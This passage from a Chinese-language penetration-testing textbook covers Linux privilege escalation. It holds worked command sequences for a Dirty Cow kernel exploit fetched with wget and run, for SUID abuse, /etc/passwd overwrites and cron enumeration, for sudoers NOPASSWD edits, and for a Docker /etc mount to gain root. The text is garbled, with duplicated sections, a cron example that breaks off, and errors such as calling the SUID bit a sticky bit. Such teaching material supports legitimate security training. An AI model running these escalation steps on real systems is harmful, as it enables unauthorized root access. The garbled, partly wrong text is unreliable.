  \ Lifecycle`）可以检查这三项内容。\n\n### 测试阶段\n\n在完成几个产品功能后，项目准备好部署到测试 (`QA`) 服务器。部署的目标是拥有一个独立的稳定服务器，让测试人员可以在那里测试\
  \ Web/移动应用程序。在此阶段，你作为安全专业人员，应该检查以下项目：\n\n*   这是你去学习 `UI` 新功能的好机会。\n\n\n\n\n\n* 使用\
  \ `Burp Professional` 版本手动对新功能进行漏洞测试（Web 渗透测试）。\n* 使用动态应用安全测试（DAST`）工具（例如 `Burp\
  \ Suite Enterprise Edition`、`Acunetix` 等）来自动化 Web 渗透测试。此任务在测试阶段实施，因为你需要一个正在运行的网站（因此在运行工具之前，必须将其部署到稳定环境中）。注意，你可以使用编排器（`Jenkins`\
  \ 或 `TFS`）来自动化此任务，在应用程序部署到测试环境后触发扫描。\n\n#### 生产环境（最终部署）\n\n一旦代码部署到生产环境，网站/移动应用程序将由运维安全（`OpSec`）团队负责。`OpSec`\
  \ 将负责监控并对基础设施进行定期的渗透测试（通常每年一次），以及对应用程序本身进行 Web 渗透测试。最近，漏洞赏金计划开始出现，公司开始聘请外部漏洞赏猎人来寻找在之前所有阶段未被发现的任何缺陷。\n\
  \n### 总结\n\n网络安全顾问 80% 以上的时间可能花在 Web 应用程序渗透测试上。我们强烈鼓励你在继续阅读本书之前掌握这个主题。掌握任何技能的简单公式基于两个因素：知识和实践（继承的技能也是一个次要因素）。在本章中与你分享的信息将帮助你像专家一样开始测试\
  \ Web 应用程序。\n\n接下来是什么？在接下来的章节中，我们将深入探讨 `Linux` 权限提升概念。\n\n# 第 10 章\n\n## Linux 权限提升\n\
  \n在此阶段，你已经拥有了一个受限的 shell，并且你想突破此限制获取一个 root shell。root 权限将允许你按自己的方式操纵系统，并可能会为你提供通往另一个主机的新路径（称为\
  \ *pivoting*）。本章主要关注 `Linux` 操作系统的权限提升，下一章将讨论 `Windows` 操作系统。尽管 `Windows` OS 在客户端主机上流行，但大多数网络基础设施和服务器都使用\
  \ `Linux` 操作系统。微软团队意识到 `Linux` 终端窗口（内核）的重要性，因此最近他们在 `Windows` 操作系统中加入了这一功能。\n\n\
  本章（以及整本书）的目标是教你方法论，而不是依赖工具来完成工作。尽管如此，你将学习 `Linux privesc` 的基础知识，以便在你的职业中应对这项任务。\n\
  \n本章将涵盖以下主题：\n\n* `Linux Kernel` 漏洞利用\n* `Linux SUID` 利用\n* `Linux` 配置文件的操纵\n* 运行服务的利用\n\
  * `sudoers` 利用\n* `Linux` 权限提升的自动化脚本\n\n## 内核漏洞与缺失配置简介\n\n`Linux` 操作系统中的权限提升可以通过两种方式实现：\n\
  \n* 利用内核漏洞\n* 利用薄弱的系统配置（主要由 root 用户实施）\n\n在本章的剩余部分中，我们将深入研究每个类别以实现目标（获取 root shell）。让我们开始吧。\n\
  \n## 内核漏洞\n\n内核是 `Linux` 操作系统的核心，它以 root 权限运行。任何可以与内核交互的缺陷将允许用户以 root 模式运行。\n\n\
  当我们想要在目标主机上执行漏洞时，会面临一些挑战。以下是步骤：\n\n1. 识别内核版本。\n2. 寻找匹配的漏洞。\n3. 传输漏洞。\n4. 编译 C 代码。\n\
  \n### 内核漏洞：Dirty Cow\n\n*dirty cow* 代表写时复制（`COW`）机制。`dirty cow` 是如何工作的？在正常情况下，`COW`\
  \ 将写入内存。该漏洞支持 Linux 版本在 2.6.22 到 3.9 之间。\n\n尽管如此，用户 `elliot` 权限有限。让我们使用 `id` 查看当前用户：\n\
  \n```bash\nelliot@ubuntu14:~$ id\nuid=1001(elliot) gid=1001(elliot) groups=1001(elliot)\n\
  ```\n\n接下来，检查内核版本：\n\n```bash\nelliot@ubuntu14:~$ uname -a\nLinux ubuntu 3.13.0-32-generic\
  \ #57-Ubuntu Tue 15 03:51:08 UTC 2014 x86_64 x86_64 GNU/Linux\n```\n\n由于版本是 3.13（大于\
  \ 3.9），我们不能假设它受到 dirty cow 漏洞的影响。尝试访问 `/etc/shadow`：\n\n```bash\nelliot@ubuntu14:~$\
  \ cat /etc/shadow\ncat: /etc/shadow: Permission denied\n```\n\n`exploit-db` 是我参考漏洞时的选处。\n\
  \n接下来，回到受限的 SSH shell 并执行以下五个操作：\n\n* 将工作目录更改到 `/tmp`，因为在这个文件夹中我们更大的灵活性。\n* 使用 `wget`\
  \ 命令下载漏洞。\n* 根据漏洞文档编译 C 代码。\n* 根据 `exploit-db` 文档执行漏洞。\n* 切换到新创建的名为 *firefart* 的用户。\n\
  \n\n\n\n\n```\n elliot@ubuntu14Server:/tmp$ wget http://172.16.0.102:8000/40839.c\n\
  --2020-08-17 11:43:50-- http://172.16.0.102:8000/40839.c\nConnecting to 172.16.0.102:8000…\
  \ connected.\nHTTP request sent, awaiting response… 200 OK\nLength: 5006 (4.9K)\
  \ [text/plain]\nSaving to: '40839.c'\n\n100%[===========================================================================================>]\
  \ 5,006 --.-K/s in 0s \n2020-08-17 11:43:50 (657 MB/s) - ‘40839.c’ saved [5006/5006]\n\
  elliot@ubuntu14Server:/tmp$ gcc ‐pthread 40839.c ‐o dirty ‐lcrypt\nelliot@ubuntu14Server:/tmp$\
  \ chmod +x dirty\nelliot@ubuntu14Server:/tmp$ ./dirty\n/etc/passwd successfully\
  \ backed up to /tmp/passwd.bak\nPlease enter the new password: \nComplete line:\n\
  firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash\n\nmmap: 7f297c216000\nptrace 0\n\
  Done! Check /etc/passwd to see if the new user was created.\nYou can log in with\
  \ the username 'firefart' and the password 'test'.\n\nDON'T FORGET TO RESTORE! $\
  \ mv /tmp/passwd.bak /etc/passwd\nelliot@ubuntu14Server:/tmp$ su firefart\nPassword:\
  \ \nfirefart@ubuntu14Server:/tmp# id\nuid=0(firefart) gid=0(root) groups=0(root)\n\
  ```\n\n我们是 root 了！\n\nDirty cow 只是一个著名的漏洞；这个练习只是为了向你展示当你使用旧版本内核时该如何完成任务。如果你打算使用另一个漏洞（例如\
  \ `overlayfs`），那么你将使用与我们处理此漏洞时相同的步骤。你只需要根据漏洞的文档对其进行编译并进行不同的执行。\n\n## SUID 漏洞利用\n\
  \n设置用户 ID（SUID）漏洞（我个人称这种漏洞为*超级用户 ID*，super user ID）是一种允许用户执行特定用户（例如 root）权限的弱点。为了搜索这类文件，我们将使用\
  \ `find` 命令来完成任务：\n\n```\n elliot@ubuntu14Server:~$ find / ‐perm ‐u=s ‐type f 2>/dev/null\n\
  /bin/umount\n/bin/mount\n/bin/ping6\n/bin/su\n/bin/ping\n/bin/fusermount\n/usr/bin/traceroute6.iputils\n\
  /usr/bin/chsh\n/usr/bin/pkexec\n/usr/bin/at\n/usr/bin/chfn\n/usr/bin/mtr\n/usr/bin/sudo\n\
  /usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n\
  /usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\n/usr/lib/eject/dmcrypt-get-device\n\
  /usr/lib/policykit-1/polkit-agent-helper-1\n/usr/sbin/pppd\n/usr/sbin/uuidd\n/opt/bashme\n\
  ```\n\n`bashme` 文件是一个很好的候选者。事实上，我为了这个练习专门创建了这个文件，向你展示它是如何工作的。你可能在想，我是如何知道其他的不是候选者的？答案很简单；它们都是\
  \ Linux 的系统文件。接下来，让我们使用 `ls` 命令查看 `bashme` 文件的权限：\n\n```\n elliot@ubuntu14Server:~$\
  \ cd /opt\nelliot@ubuntu14Server:/opt$ ls ‐la\ntotal 20\ndrwxr-xr-x 2 root root\
  \ 4096 Aug 17 16:50 .\ndrwxr-xr-x 22 root root 4096 Aug 17 10:25 ..\n‐rwsr‐xr‐x\
  \ 1 root root 8577 Aug 17 16:50 bashme\n```\n\n注意权限值开头的 `s`（它被称为*粘滞位*，sticky bit）。事实上，发生这种情况是因为\
  \ root 用户已经对该文件执行了以下命令之一。换句话说，以下两条命令导致了粘滞位的出现：\n\n```\n $chmod u+s /opt/bashme\n\
  $chmod 4755 /opt/bashme\n```\n\n在这个阶段，我们只需要使用我们受限的用户 shell 来执行它：\n\n```\n elliot@ubuntu14Server:/opt$\
  \ ./bashme\nroot@ubuntu14Server:/opt# id\nuid=0(root) gid=1001(elliot) groups=0(root),1001(elliot)\n\
  ```\n\n我们是 root！\n\nDirty cow 只是一个著名的漏洞；这个练习只是为了向你展示当你使用旧版本内核时该如何完成任务。如果你打算使用另一个漏洞（例如\
  \ `overlayfs`），那么你将使用与我们处理此漏洞时相同的步骤。你只需要根据漏洞的文档对其进行编译并进行不同的执行。\n\n## SUID 漏洞利用\n\
  \n设置用户 ID（SUID）漏洞（我个人称这种漏洞为*超级用户 ID*，super user ID）是一种允许用户执行特定用户（例如 root）权限的弱点。为了搜索这类文件，我们将使用\
  \ `find` 命令来完成任务：\n\n```\n elliot@ubuntu14Server:~$ find / ‐perm ‐u=s ‐type f 2>/dev/null\n\
  /bin/umount\n/bin/mount\n/bin/ping6\n/bin/su\n/bin/ping\n/bin/fusermount\n/usr/bin/traceroute6.iputils\n\
  /usr/bin/chsh\n/usr/bin/pkexec\n/usr/bin/at\n/usr/bin/chfn\n/usr/bin/mtr\n/usr/bin/sudo\n\
  /usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n\
  /usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\n/usr/lib/eject/dmcrypt-get-device\n\
  /usr/lib/policykit-1/polkit-agent-helper-1\n/usr/sbin/pppd\n/usr/sbin/uuidd\n/opt/bashme\n\
  ```\n\n`bashme` 文件是一个很好的候选者。事实上，我为了这个练习专门创建了这个文件，向你展示它是如何工作的。你可能在想，我是如何知道其他的不是候选者的？答案很简单；它们都是\
  \ Linux 的系统文件。接下来，让我们使用 `ls` 命令查看 `bashme` 文件的权限：\n\n```\n elliot@ubuntu14Server:~$\
  \ cd /opt\nelliot@ubuntu14Server:/opt$ ls ‐la\ntotal 20\ndrwxr-xr-x 2 root root\
  \ 4096 Aug 17 16:50 .\ndrwxr-xr-x 22 root root 4096 Aug 17 10:25 ..\n‐rwsr‐xr‐x\
  \ 1 root root 8577 Aug 17 16:50 bashme\n```\n\n注意权限值开头的 `s`（它被称为*粘滞位*，sticky bit）。事实上，发生这种情况是因为\
  \ root 用户已经对该文件执行了以下命令之一。换句话说，以下两条命令导致了粘滞位的出现：\n\n```\n $chmod u+s /opt/bashme\n\
  $chmod 4755 /opt/bashme\n```\n\n在这个阶段，我们只需要使用我们受限的用户 shell 来执行它：\n\n```\n elliot@ubuntu14Server:/opt$\
  \ ./bashme\nroot@ubuntu14Server:/opt# id\nuid=0(root) gid=1001(elliot) groups=0(root),1001(elliot)\n\
  ```\n\n## 覆盖密码文件\n\n`/etc/passwd` 文件包含了用户账户的信息。如果我们对该文件有写入权限，我们就可以添加一个新的 root 用户并获得\
  \ root 权限。有多种方法可以实现，所示：\n\n1. 使用 `echo` 将新用户追加到文件中。\n2. 使用 `openssl` 为用户生成密码。\n\
  3. 如果 `cp` 命令具有 SUID 位，则使用它。\n4. 如果 `Nano` 或 `Vim` 文本编辑器具有 SUID 位，则使用它们。\n\n在这种情况下，我们能够添加新用户是因为我们拥有*写入权限*。第二种情况是\
  \ `cp` 命令具有 SUID 位。如果是那样，你必须创建一个新的密码文件，然后使用 `cp` 命令完成任务：\n\n```\n$cp [your custom\
  \ generated passwd file] /etc/passwd\n```\n\n在添加新的 root 用户之前，不要忘记从原始文件复制现有用户。\n\n\
  最后一种场景可以在 SUID 设置为 Nano 或 Vim 文本编辑器时被利用，例如。那么，该标志将允许你使用这些文本编辑器之一来更改密码文件的内容并添加一个新的\
  \ root 用户。\n\n## CRON 权限提升\n\nCron 是 Linux 系统内部的调度器，允许用户创建计划任务。通过任务，我们指的是命令；对于我们黑客来说，这是一个利用的大门。如果我们能检查\
  \ root 用户正在尝试调度什么呢？如果我们能找到一个可写的脚本文件，那么调度器将以 root 权限执行。很酷对吧？\n\n### CRON 基础\n\n\n\
  \n\nroot 用户可以通过多种方式在 Linux 系统上调度运行任务。第一种方法是使用 `cron` 目录：\n\n* `/etc/cron.daily/`\n\
  * `/etc/cron.hourly/`\n* `/etc/cron.monthly/`\n* `/etc/cron.weekly/`\n\n保存在每个文件夹中的任何脚本文件将根据其对应的时间段执行。例如，位于\
  \ `/etc/cron.daily/` 文件夹中的脚本文件将每天执行一次。\n\n### Crontab\n\n第二方法是使用 `crontab`。root\
  \ 用户可以使用 `/etc/crontab` 文件调度系统范围内的定时任务。这是 root 用户想要调度任务时可能遇到的最常见场景。该文件中 cron 任务条目的典型格式如下：\n\
  \n```\n Minute(0-59) Hour(0-24) Day(1-31) Month(1-12) Day of week(0-6, 0 代表星期日，6\
  \ 代表星期六) [要执行的命令]\n```\n\n例如，若要在每小时第 0 分钟（例如早上 6 点、7 点等）运行脚本 `sys.sh`，请使用以下命令：\n\
  \n```\n 0 * * * * /root/sys.sh\n```\n\n星号表示分钟、月份等任何可能的取值。你还可以使用以下操作符：\n\n* **逗号\
  \ (`,`)**：指定连续的整数，如 `1,2,3,4,5`。\n* **连字符 (`‐`)**：该字符允许你指定范围。例如，`1‐5` 等同于 `1,2,3,4,5`。\n\
  * **斜杠 (`/`)**：指定步长值。例如，每 4 小时等于 `*/4`。\n\n`/etc/crontab` 是一个系统级配置文件。但每个用户都可以通过执行以下命令配置自己的\
  \ crontab 任务：\n\n```\n $crontab -e\n```\n\n上述命令将打开 crontab 用户文件并允许用户添加任务。\n\n###\
  \ Anacrontab\n\n添加 cron 任务的另一种方法是使用 `anacrontab`。该方法的系统级配置文件位于 `/etc/anacrontab`。为什么要使用这种方法？实际上，`anacron`\
  \ 并不期望你的主机始终运行状态；它会在你重启主机后检查所有调度的脚本。这对于那些预期会关机的普通主机非常实用。anacron 中任务的格式如下：\n\n```\n\
  \ Period     delay job-identifier command\n7          10    backup.daily   cp /etc/passwd\
  \ /root/\n```\n\n第一个字段是周期，一个代表任务执行天数的数值：\n\n* **1**：代表每天\n* **7**：代表每周\n* **30**：代表每月\n\
  \n或者你也可以使用这种格式：`@daily / / @weekly / @monthly`。你可以使用自定义数字来指定任意天数。\n\n第二个字段是机器在重启后需要等待的分钟延迟（在执行调度任务之前）。\n\
  \n第三个字段是任务名称标识符。每个任务都需要一个唯一的名称，且同名文件将保存在 `/var/spool/anacron/` 目录下。该文件将包含任务最后一次执行的时间戳。\n\
  \n最后，最后一个字段将标识我们想要执行的命令。\n\n### 列举与利用 CRON\n\n要列出所有 cron 目录的内容，请使用以下命令：\n\n```\n\
  \ $ls -la /etc/cron* 2>/dev/null\n```\n\n要搜索全局可写的 cron 任务，请使用以下命令：\n\n```\n $find\
  \ /etc/cron* -perm -0002 -type f -exec ls -la {} \\; -exec cat {} 2>/dev/null \\\
  ;\n```\n\n要检查 crontab 内容，请使用以下命令：\n\n```\n $cat /etc/crontab 2>/dev/null\n```\n\n\
  检查 root 用户的 crontab 条目，请使用以下命令：\n\n```\n $crontab -l -u root\n```\n\n列出 anacron\
  \ 任务，请使用以下命令：\n\n```\n $ls -la /var/spool/anacron 2>/dev/null\n```\n\n让我们从 Linux\
  \ 主机上利用 cron 的示例开始。和一样，我们有一个受限 shell 用户 `elliot` 连接到 Ubuntu 服务器。查看 crontab 条目可以发现一个每分钟运行一次并执行\
  \ `/root/schedule/` 目录中保存脚本的任务：\n\n```\n elliot@ubuntu14Server:~$ cat /etc/crontab\
  \ 2>/dev/null\n[..]\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n\
  25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily\
  \ )\n47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly\
  \ )\n52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly\
  \ )\n* * * * *  root /opt/backup.sh\n#\nelliot@ubuntu14Server:~$\n```\n\n\n\n\n\
  ```\n # Allow members of group sudo to execute any command\n#%sudo ALL=(ALL:ALL)\
  \ ALL\n\n# See sudoers(5) for more information on \"#include\" directives:\n\n#includedir\
  \ /etc/sudoers.d\nelliot ALL=(ALL) NOPASSWD: ALL\n```\n\n为了确保更改生效，请退出 `elliot` 的\
  \ SSH 会话并重新登录。登录后，使用 `sudo` 命令执行 `SH` 壳。注意，终端窗口没有请求密码，这是因为我们之前添加了“NOPASSWD”配置：\n\
  \n```\n elliot@ubuntu14Server:~$ sudo sh ‐i\n# id\nuid=0(root) gid=0(root) groups=0(root)\n\
  #\n```\n\n## 利用正在运行的服务\n\nLinux 系统上安装的一些服务会以 root 权限模式运行。此漏洞允许我们利用这种行为并获取 root shell。一个作为守护进程运行的优秀服务是\
  \ Docker 引擎（其他良好的例子还有 Apache Web 服务器、MySQL 数据库服务器等）。首先，列出正在运行的服务并查找 Docker：\n\n\
  ```\n elliot@ub01:/$ ps ‐aux | grep Docker\nelliot 3046 0.0 0.0 17532 724 pts/0\
  \ S+ 09:14 0:00 grep ‐‐color=auto Docker\n```\n\n通过操纵 `sudoers` 配置文件执行我们之前相同的攻击。接下来，运行一个基于\
  \ Alpine 镜像的新容器：\n\n```\n elliot@ub01:~$ docker run ‐itd ‐v /etc/:/mnt/ alpine\n\
  17d6da6fca8152fd8f2360abc5a4cad928c0d655e2c1fadac7df1de6c669dd23\nelliot@ub01:~$\
  \ docker ps\nCONTAINER ID      IMAGE   COMMAND   CREATED        STATUS      PORTS\
  \   NAMES\n17d6da6fca81      alpine  \"/bin/sh\" 10 seconds ago Up 9 seconds   \
  \     bold_aryabhata \n```\n\n注意，我们将 Ubuntu 宿主机上的 `/etc/` 目录挂载到了 Docker 容器的 `/mnt/`\
  \ 上。现在是时候与容器交互以编辑 `sudoers` 文件了：\n\n```\n elliot@ub01:~$ docker exec ‐it 17d6da6fca81\
  \ /bin/sh\n/ # cd /mnt/\n/mnt # echo \"elliot ALL=(ALL) NOPASSWD: ALL\" >> sudoers\n\
  /mnt # exit\n```\n\n让我们看看是否可以使用 `sudo` 命令在 Ubuntu 宿主机上获取 root shell：\n\n```\n elliot@ub01:~$\
  \ sudo sh ‐i\n# id\nuid=0(root) gid=0(root) groups=0(root)\n#\n```\n\n## 自动化脚本\n\
  \n到此时，你应该已经理解了如何在受限 shell 中获取 root 权限。尽管如此，本章讨论的所有命令都可以自动化，以检查目标 Linux 系统是否存在漏洞。从表面上看，信息量是巨大的，自动化脚本将使生活变得更轻松。当你想要使用脚本时，请记住遵循以下步骤：\n\
  \n1. 在你的 Kali 宿主机上启动 Web 服务器（这样你可以传输脚本文件）。\n2. 从目标 Linux 宿主机上的受限 shell 出，执行以下操作：\n\
  \    1. 将当前目录更改到你有权限写入的目录（例如，`/tmp/`）。\n    2. 使用 `wget` 或 `curl` 下载文件。\n    3.\
  \ 使用 `chmod + x` 命令更改文件权限。\n    4. 执行脚本文件（可选地保存输出内容，以防你丢失 shell）。\n\n以下是你在渗透测试期间可以使用的前三个自动化脚本（你可以将它们保存起来，以便在需要权限提升时随时使用）：\n\
  \n* `LinEnum`: [github.com/rebootuser/LinEnum](http://github.com/rebootuser/LinEnum)\n\
  * `LinuxPrivChecker`: [github.com/sleventyeleven/linuxprivchecker](http://github.com/sleventyeleven/linuxprivchecker)\n\
  * `LinuxExploitSuggester`: [github.com/mzet-/linux-exploit-suggester](http://github.com/mzet-/linux-exploit-suggester)\n\
  \n`LinEnum` 是一个非常棒的工具。当你在目标 Linux 宿主机上使用此工具时，实现步骤如下：\n\n1. 在我的 Kali 宿主机（攻击者机器）上启动\
  \ Web 服务器。\n2. 在受限 shell 上，将当前目录更改为 `/tmp`（因为该文件夹通常允许所有人写入执行）。\n3. 使用 `wget` 命令将\
  \ `LinEnum` 脚本下载到目标（受害者）主机。\n   ```\n     $wget http://[KaliIP]/LinEnum.sh\n   ```\n\
  4. 给文件赋予执行权限。\n   ```\n     $chmod +x LinEnum.sh\n   ```\n5. 执行它。\n   ```\n    \
  \ $./LinEnum.sh\n   ```\n\n### 总结\n\n如果 root 用户对其配置不当（或内核未进行适当更新），Linux 操作系统就会受到权限提升漏洞的影响。如果是这样，你有充分的空间获取\
  \ root shell。这个主题非常复杂，理想情况下你能够通过本章中的实际场景来理解它，并将这些知识应用于你自己的任务中。在下一章中，你将学习如何利用 Windows\
  \ 操作系统。\n\n如果 root 用户对其配置不当（或内核未进行适当更新），Linux 操作系统就会受到权限提升漏洞的影响。如果是这样，你有充分的空间获取\
  \ root shell。这个主题非常复杂，理想情况下你能够通过本章中的实际场景来理解它，并将这些知识应用于你自己的任务中。在下一章中，你将学习如何利用 Windows\
  \ 操作系统。\n\n# 第 11 章\n\n## Windows 权限提升\n\n正如你所知，微软 Windows 操作系统在个人用户和公司员工中非常流行。关于\
  \ Windows 的权限提升有很多内容要涵盖，和以往一样，所有的概念都通过示例进行了解释。在本章结束时，你应该能够轻松地提升权限。\n\n本章涵盖了主题：\n\
  \n* 如何枚举 Windows 操作系统\n* 在受限 shell 中向 Windows 传输文件\n* Windows 内核利用\n* 利用 Windows\
  \ 服务\n* Windows GUI 利用\n* 权限提升自动化工具\n\n## Windows 系统枚举\n\n在开始利用 Windows 操作系统之前，我们需要对主机进行枚举。在本节中，你将看到完成工作所需的基础枚举命令。\n\
